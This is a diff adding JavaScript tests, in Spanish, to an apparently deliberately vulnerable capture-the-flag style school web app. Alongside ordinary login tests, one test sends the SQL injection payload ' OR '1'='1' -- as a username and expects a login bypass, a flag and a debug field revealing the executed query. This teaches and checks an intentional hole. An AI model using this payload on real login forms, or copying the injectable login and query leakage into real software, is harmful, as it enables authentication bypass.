@@ -23,3 +23,32 @@ describe('Database seed', () => {
     assert.ok(usernames.includes('alumno_perez'));
   });
 });
+
+describe('Autenticación', () => {
+  test('Login con credenciales válidas retorna rol y nombre', async () => {
+    const res = await request(app)
+      .post('/login')
+      .send({ username: 'alumno_lopez', password: 'alumno123' });
+    assert.equal(res.status, 200);
+    assert.equal(res.body.rol, 'alumno');
+    assert.ok(res.body.nombre);
+  });
+
+  test('Login con contraseña incorrecta retorna 401', async () => {
+    const res = await request(app)
+      .post('/login')
+      .send({ username: 'alumno_lopez', password: 'wrong' });
+    assert.equal(res.status, 401);
+  });
+});
+
+describe('VULN 1 — SQL Injection en login', () => {
+  test("Payload ' OR '1'='1' -- hace bypass y revela FLAG{sql_1nj3ct10n}", async () => {
+    const res = await request(app)
+      .post('/login')
+      .send({ username: "' OR '1'='1' --", password: 'irrelevante' });
+    assert.equal(res.status, 200);
+    assert.equal(res.body.flag, 'FLAG{sql_1nj3ct10n}');
+    assert.ok(res.body.debug, 'Debe incluir la query ejecutada');
+  });
+});
